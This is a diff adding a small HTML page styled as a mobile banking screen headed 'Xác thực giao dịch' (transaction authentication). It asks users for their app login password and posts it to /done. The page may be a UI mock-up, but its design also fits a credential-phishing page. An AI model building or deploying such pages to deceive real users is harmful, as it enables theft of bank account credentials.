@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter">
+    <title>Document</title>
+  </head>
+  <body>
+    <div class="wrap">
+      <div class="header">
+        <a class="direct" href="./payment">Quay lại</a>
+        <p class="title">XÁC THỰC GIAO DỊCH</p>
+        <a class="direct" href="./payment">Hủy</a>
+      </div>
+      <form action="/done" method="post">
+        <div class="content">
+          <div class="label">
+            Vui lòng nhập Mật khẩu đăng nhập ứng dụng để xác thực giao dịch
+          </div>
+          <input id="password" name="password" class="input" type="password" placeholder="Mật khẩu đăng nhập" />
+        </div>
+        <div class="continue">
+            <input class="btn" type="submit" value="Tiếp">
+        </div>
+      </form>
+    </div>
+  </body>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding-left: 16px;
+      padding-right: 16px;
+      background-color: #23272a;
+    }
+    .wrap {
+      width: 375px;
+      height: 667px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+    .title {
+      font-family: "Inter";
+      font-style: normal;
+      font-weight: 400;
+      font-size: 16px;
+      line-height: 19px;
+      text-align: center;
+      color: #fefefe;
+    }
+    .direct {
+      font-family: "Inter";
+      font-style: normal;
+      font-weight: 400;
+      font-size: 13px;
+      line-height: 16px;
+      color: #1297fc !important;
+      text-decoration: none;
+    }
+    .content {
+      margin-top: 30px;
+      border: 1px solid #ffffff;
+      border-radius: 20px;
+      padding: 12px;
+      min-height: 110px;
+      font-family: "Inter";
+      font-style: normal;
+      font-weight: 400;
+      font-size: 14px;
+      line-height: 17px;
+
+      color: #ffffff;
+    }
+    .input {
+      border-bottom: 1px solid #d4d4d4;
+      margin-top: 28px;
+      font-family: "Inter";
+      font-style: normal;
+      font-weight: 400;
+      font-size: 14px;
+      line-height: 17px;
+      color: #d4d4d4;
+      background-color:#23272A;
+      width: 100%;
+;
+    }
+    .input::placeholder {
+      color: #D4D4D4;
+;
+    }
+    .continue {
+      position: fixed;
+      bottom: 0;
+      margin-bottom: 20px;
+    }
+    .btn {
+      width: 326px;
+      height: 47px;
+      background: #1297fc;
+      border-radius: 30px;
+      border: none;
+      margin-top: 20px;
+      font-family: "Inter";
+      font-style: normal;
+      font-weight: 700;
+      font-size: 15px;
+      line-height: 18px;
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
+</html>
